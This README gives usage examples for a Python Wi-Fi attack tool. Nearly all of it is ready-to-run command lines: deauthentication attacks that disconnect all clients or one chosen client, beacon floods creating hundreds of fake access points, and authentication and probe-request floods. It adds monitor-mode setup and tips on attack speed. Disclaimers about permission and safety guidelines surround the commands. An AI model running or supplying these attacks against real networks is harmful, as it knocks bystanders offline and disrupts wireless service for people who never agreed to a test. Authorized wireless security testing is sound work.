# WiFi Security Tester - Usage Examples

## ⚠️ Important Reminder
**Only use these examples on networks you own or have explicit permission to test!**

## Basic Usage Examples

### 1. Interactive Mode (Recommended for Beginners)
```bash
sudo python3 wifi_tester_gui.py
```
This launches an interactive menu interface that guides you through:
- Interface setup
- Network scanning
- Target selection
- Attack execution

### 2. Quick Network Scan
```bash
# Scan for 15 seconds and display results
sudo python3 wifi_security_tester.py --scan --duration 15
```

### 3. Deauthentication Attacks

#### Basic Deauth (Disconnect all clients)
```bash
# Interactive: scan and select target
sudo python3 wifi_security_tester.py --deauth

# Direct target specification
sudo python3 wifi_security_tester.py --deauth -t AA:BB:CC:DD:EE:FF
```

#### Target Specific Client
```bash
# Disconnect specific device
sudo python3 wifi_security_tester.py --deauth -t AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66
```

#### Limited Packet Count
```bash
# Send exactly 50 deauth packets then stop
sudo python3 wifi_security_tester.py --deauth -t AA:BB:CC:DD:EE:FF --count 50
```

### 4. Beacon Flooding Attacks

#### Create Fake Access Points
```bash
# Create 500 fake APs
sudo python3 wifi_security_tester.py --beacon-flood --count 500

# Continuous beacon flooding (stop with Ctrl+C)
sudo python3 wifi_security_tester.py --beacon-flood
```

### 5. Authentication Flooding
```bash
# Flood target with 2000 auth requests
sudo python3 wifi_security_tester.py --auth-flood -t AA:BB:CC:DD:EE:FF --count 2000

# Continuous auth flooding
sudo python3 wifi_security_tester.py --auth-flood -t AA:BB:CC:DD:EE:FF
```

### 6. Probe Request Flooding
```bash
# Flood with probe requests for specific network
sudo python3 wifi_security_tester.py --probe-flood --ssid "MyHomeWiFi" --count 1000

# Continuous probe flooding
sudo python3 wifi_security_tester.py --probe-flood --ssid "TargetNetwork"
```

## Advanced Usage Examples

### 7. Specify Interface and Channel
```bash
# Use specific interface and set channel
sudo python3 wifi_security_tester.py --deauth -i wlan0 -t AA:BB:CC:DD:EE:FF --channel 6
```

### 8. Combined Operations
```bash
# Scan, then perform deauth attack
sudo python3 wifi_security_tester.py --scan --deauth --duration 10
```

### 9. Testing Multiple Attack Vectors
```bash
# Test 1: Deauth attack for 30 seconds
sudo python3 wifi_security_tester.py --deauth -t AA:BB:CC:DD:EE:FF --count 300

# Test 2: Auth flood
sudo python3 wifi_security_tester.py --auth-flood -t AA:BB:CC:DD:EE:FF --count 1000

# Test 3: Beacon flood to create interference
sudo python3 wifi_security_tester.py --beacon-flood --count 200
```

## Real-World Testing Scenarios

### Home Network Security Assessment

1. **Test WiFi Resilience**
   ```bash
   # Step 1: Scan your network
   sudo python3 wifi_security_tester.py --scan
   
   # Step 2: Test deauth protection
   sudo python3 wifi_security_tester.py --deauth -t YOUR_ROUTER_BSSID --count 100
   
   # Step 3: Check if devices reconnect automatically
   ```

2. **Test Access Point Stability**
   ```bash
   # Stress test with auth flooding
   sudo python3 wifi_security_tester.py --auth-flood -t YOUR_ROUTER_BSSID --count 500
   ```

3. **Test Network Visibility**
   ```bash
   # Create interference with beacon flooding
   sudo python3 wifi_security_tester.py --beacon-flood --count 100
   ```

### Enterprise Network Testing

1. **Client Isolation Testing**
   ```bash
   # Test if enterprise AP handles deauth attacks
   sudo python3 wifi_security_tester.py --deauth -t ENTERPRISE_AP_BSSID -c CLIENT_MAC
   ```

2. **Load Testing**
   ```bash
   # Test AP performance under auth flood
   sudo python3 wifi_security_tester.py --auth-flood -t ENTERPRISE_AP_BSSID --count 2000
   ```

## Troubleshooting Common Issues

### Interface Problems
```bash
# Check available interfaces
iwconfig

# Manually set monitor mode if automatic fails
sudo airmon-ng start wlan0
sudo iwconfig wlan0mon channel 6

# Then use the monitor interface
sudo python3 wifi_security_tester.py --deauth -i wlan0mon -t AA:BB:CC:DD:EE:FF
```

### Permission Issues
```bash
# Ensure you're running as root
sudo -i
python3 /path/to/wifi_security_tester.py --scan
```

### Network Interface Restoration
```bash
# If interface gets stuck in monitor mode
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

## Performance Tips

### Optimize Attack Speed
```bash
# For faster deauth attacks (be careful not to overwhelm)
sudo python3 wifi_security_tester.py --deauth -t AA:BB:CC:DD:EE:FF --count 1000

# For sustained attacks with lower impact
sudo python3 wifi_security_tester.py --deauth -t AA:BB:CC:DD:EE:FF --count 10
```

### Monitor Attack Effectiveness
- Use another device to monitor network connectivity
- Check router logs for attack detection
- Monitor client reconnection behavior

## Safety Guidelines

### Before Testing
1. Ensure you own the network or have written permission
2. Inform other users about the test
3. Have a backup internet connection
4. Document your testing activities

### During Testing
1. Monitor the impact on legitimate users
2. Stop immediately if unintended effects occur
3. Keep tests short and controlled
4. Don't test during critical business hours

### After Testing
1. Restore all interfaces to normal mode
2. Restart network services if needed
3. Document findings and vulnerabilities
4. Implement security improvements

## Legal Reminders

- **Only test networks you own**
- **Get written permission for any other testing**
- **Follow local laws and regulations**
- **Use for educational purposes only**
- **Report vulnerabilities responsibly**

Remember: The goal is to improve security, not to cause harm!